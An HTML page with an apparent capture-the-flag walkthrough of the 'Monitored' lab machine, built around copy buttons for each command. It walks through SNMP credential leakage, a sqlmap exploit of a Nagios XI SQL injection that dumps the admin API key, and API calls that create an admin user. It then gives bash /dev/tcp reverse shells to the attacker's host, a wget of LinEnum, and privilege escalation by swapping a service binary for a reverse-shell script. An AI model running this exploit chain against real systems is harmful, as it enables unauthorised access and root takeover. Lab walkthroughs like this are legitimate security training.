<!DOCTYPE html>
<html>
    <head>
        <link rel="stylesheet" href="../../css/Font.css">
        <link rel="stylesheet" href="css/code.css">
        <link rel="stylesheet" href="../../css/prism.css">
        <script src="../../js/prism.js"></script>
        <script src="js/copycode.js"></script>
        <script type="module"
            src="https://unpkg.com/@deckdeckgo/highlight-code@latest/dist/deckdeckgo-highlight-code/deckdeckgo-highlight-code.esm.js"></script>
    </head>
    <body>

        <pre>

            <img src="../../public/images/Monitored/Monitored-1.png"/>

            <b>
                Information Gathering
            </b>

            let’s start nmap to see open ports and services running.

            
            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        nmap -sC -sV -A 10.10.11.248
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            <img src="../../public/images/Monitored/Monitored-2.png"/>

            We see port 80 is running http service. So, let’s visit the site.

            <img src="../../public/images/Monitored/Monitored-3.png"/>

            We are directed to a login page.

            Well we still don’t have a lot of information to proceed further. So, let’s do a
            udp scan this may take around 15min (depends on your machine).

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        sudo nmap -sU -sV -sC 10.10.11.248
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            <img src="../../public/images/Monitored/Monitored-4.png"/>

            We begin by observing the SNMP service, and subsequently, we proceed to
            explain its functionality. We utilize SNMP version 2c along with the
            community string “public” to initiate communication with the device. This
            enables us to retrieve information regarding various variables present on the device.

            Let’s use snmpwalk

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        snmpwalk -v2c -c public nagios.monitored.htb
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            <img src="../../public/images/Monitored/Monitored-5.png"/>

            Observe this username and password. It’s interesting, let’s try this as the
            credentials to the website.

            We can not log in with this but it leads us to this page.

            <img src="../../public/images/Monitored/Monitored-6.png"/>

            We’re now employing SQLMap to exploit a known vulnerability (CVE) that
            involves a Post-Authentication SQL Injection.
            Here, we will use the username and password obtained in the last
            step. This action is part of our strategy to add a new user with administrative privileges.

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        sqlmap -u "https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=
                        $(curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=500' | 
                        awk -F'"' '{print $12}')" --level 5 --risk 3 -p id --batch -D nagiosxi --dump -T xi_users
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            <img src="../../public/images/Monitored/Monitored-7.png"/>

            <img src="../../public/images/Monitored/Monitored-8.png"/>

            That’s it, we got the admin api key. Now let’s add a new user.

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        curl -XPOST --insecure 
                        "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" 
                        -d "username=myadmin&password=myadmin&name=myadmin&email=myadmin@localhost&auth_level=admin"
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            <img src="../../public/images/Monitored/Monitored-9.png"/>

            Try to log in with the username and password we just created. That is,
            uname: myadmin psswd: myadmin.

            <img src="../../public/images/Monitored/Monitored-10.png"/>

            We are in. After exploring the site i came across core config manager
            {Navigation -> Configuration -> core configuration manager}. Interestingly,
            this feature allows us to add and run a command. Hence, let’s first add a
            command in the command section to get the reverse shell.

            <img src="../../public/images/Monitored/Monitored-11.png"/>

            <img src="../../public/images/Monitored/Monitored-12.png"/>

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        bash -c 'bash -i >&/dev/tcp/your_ip/port 0>&1'
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            <img src="../../public/images/Monitored/Monitored-13.png"/>

            Apply the changes and navigate to services to execute the command. But
            before that start a listener on the port u just mentioned in the command.

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        nc -lvnp port
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            <img src="../../public/images/Monitored/Monitored-14.png"/>

            Let’s do the execution part.

            In the services section click on add new and select the just added command
            from check command list and click on Run Check Command.

            <img src="../../public/images/Monitored/Monitored-15.png"/>

            Click on Run Check Command again.

            <img src="../../public/images/Monitored/Monitored-16.png"/>

            The page will look like this. Means we have got something on our listener. Let’s check that.

            <img src="../../public/images/Monitored/Monitored-17.png"/>

            We got the reverse shell.

            Explore the shell and find the user flag.

            <img src="../../public/images/Monitored/Monitored-18.png"/>

            Now that we have the user flag. Let’s move to the privilege escalation part.

            I immediately uploaded LinEnum.sh.

            To do so, first download the raw code and save it in any directory on your
            machine. Then, run a python http server in that directory.

            
            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        pyhton3 -m http.server 9990
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            <img src="../../public/images/Monitored/Monitored-19.png"/>

            Now, on the remote machine we can download the LinEnum.sh file with the following command.

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        wget http://your_ip:port/LinEnum.sh
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            <img src="../../public/images/Monitored/Monitored-20.png"/>

            let’s give executable permissions to LinEnum.sh.

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        chmod +wx LinEnum.sh
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            <img src="../../public/images/Monitored/Monitored-21.png"/>

            To run LinEnum enter the command.

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        ./LinEnum.sh
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            Well we found some interesting stuff. The files with .sh extensions are
            running shell scripts. So let’s explore them.

            <img src="../../public/images/Monitored/Monitored-22.png"/>

            manage_services.sh looks interesting. Check it out by using the following command.

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        cat /usr/local/nagiosxi/scripts/manage_services.sh
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            <img src="../../public/images/Monitored/Monitored-23.png"/>

            Details to exploit the npcd service by replacing its executable file
            `/usr/local/nagios/bin/npcd` with a bash script that establishes a
            reverse shell to the attacker’s machine;

            1. Understanding the Environment

            2. Exploiting the Service

            3. Creating the Malicious Script

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        #!/bin/bash
                        bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            <img src="../../public/images/Monitored/Monitored-24.png"/>

            4. Setting Permissions

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        chmod +x /usr/local/nagios/bin/npcd
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            5. Restarting the Service

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        sudo /usr/local/nagiosxi/scripts/manage_services.sh restart npcd
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            <img src="../../public/images/Monitored/Monitored-25.png"/>

            Do not forget to keep a listener running on the port you mentioned in npcd
            file before you restart the npcd service.

            <img src="../../public/images/Monitored/Monitored-26.png"/>

            By following these steps, we effectively replace the npcd service’s executable
            file with a malicious script that establishes a reverse shell connection to our
            machine, providing us with unauthorized access to the remote system.

            <img src="../../public/images/Monitored/Monitored-27.png"/>

            The root access is now obtained.

            The root flag is in the root directory. Simply enter the following command.

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        cat /root/root.txt
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>


        </pre>
    </body>